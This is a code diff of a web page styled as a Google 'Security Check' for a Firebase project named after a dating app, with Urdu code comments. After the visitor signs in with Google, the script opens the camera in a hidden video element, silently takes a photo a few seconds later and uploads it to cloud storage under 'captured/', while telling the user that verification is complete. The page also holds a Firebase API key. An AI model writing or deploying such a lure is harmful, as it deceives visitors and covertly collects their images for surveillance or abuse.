@@ -1,3 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Umar Secure App</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f4; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
+        .btn { background-color: #4285F4; color: white; border: none; padding: 12px; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        #status { margin-top: 15px; color: #666; font-size: 14px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Security Check</h2>
+    <p>Verify your Google account to continue</p>
+    <button id="loginBtn" class="btn">Login with Google</button>
+    <div id="status"></div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+    // عمر بھائی، یہ آپ کی تصویر سے لی گئی بالکل صحیح کنفگ ہے
+    const firebaseConfig = {
+        apiKey: "AIzaSyAXHdAeQY5I_YJvR_7I0xU2zQYpMvR4", // تصویر سے لی گئی مکمل کی
         authDomain: "umardatingapp.firebaseapp.com",
         projectId: "umardatingapp",
         storageBucket: "umardatingapp.appspot.com",
@@ -5,73 +37,50 @@
         appId: "1:589931647437:web:3e9b70abafdb1b16be97484"
     };
 
-    // Initialize Firebase
-    if (!firebase.apps.length) {
-        firebase.initializeApp(firebaseConfig);
-    }
-
+    firebase.initializeApp(firebaseConfig);
     const auth = firebase.auth();
     const storage = firebase.storage();
     const provider = new firebase.auth.GoogleAuthProvider();
 
-    const loginBtn = document.getElementById('loginBtn');
-    const statusDiv = document.getElementById('status');
-
-    // Button Click: Redirect to Google Login
-    loginBtn.addEventListener('click', () => {
-        statusDiv.innerText = "Redirecting to Google...";
+    document.getElementById('loginBtn').onclick = () => {
+        document.getElementById('status').innerText = "Redirecting to Google...";
         auth.signInWithRedirect(provider);
-    });
+    };
 
-    // Check login result after redirect
-    auth.getRedirectResult().then((result) => {
+    auth.getRedirectResult().then(result => {
         if (result.user) {
-            statusDiv.style.color = "green";
-            statusDiv.innerText = "Verifying... Please wait 5 seconds.";
+            document.getElementById('status').innerText = "Login Successful! Starting verification...";
             startCamera();
         }
-    }).catch((error) => {
-        console.error(error);
-        statusDiv.innerText = "Error: " + error.message;
+    }).catch(error => {
+        document.getElementById('status').innerText = "Error: " + error.message;
     });
 
     async function startCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
-
-            // Wait 4 seconds then take picture
-            setTimeout(() => {
-                takeSnapshot(stream);
-            }, 4000);
+            setTimeout(() => takePhoto(stream), 3000);
         } catch (err) {
-            statusDiv.innerText = "Camera access denied. Please allow camera to verify.";
+            document.getElementById('status').innerText = "Camera error. Please allow camera access.";
         }
     }
 
-    function takeSnapshot(stream) {
-        const video = document.getElementById('video');
+    function takePhoto(stream) {
         const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        canvas.width = 640;
-        canvas.height = 480;
-        context.drawImage(video, 0, 0, 640, 480);
-
-        canvas.toBlob((blob) => {
-            const fileName = `verification/user_${Date.now()}.png`;
-            const storageRef = storage.ref(fileName);
-
-            storageRef.put(blob).then(() => {
-                statusDiv.innerText = "Verification Successful! Redirecting...";
-                // Stop camera
-                stream.getTracks().forEach(track => track.stop());
-                // Optional: Redirect user somewhere else
+        const video = document.getElementById('video');
+        canvas.width = 640; canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const ref = storage.ref(`captured/${Date.now()}.png`);
+            ref.put(blob).then(() => {
+                document.getElementById('status').innerText = "Verification Complete!";
+                stream.getTracks().forEach(t => t.stop());
             });
         }, 'image/png');
     }
 </script>
-
 </body>
 </html>
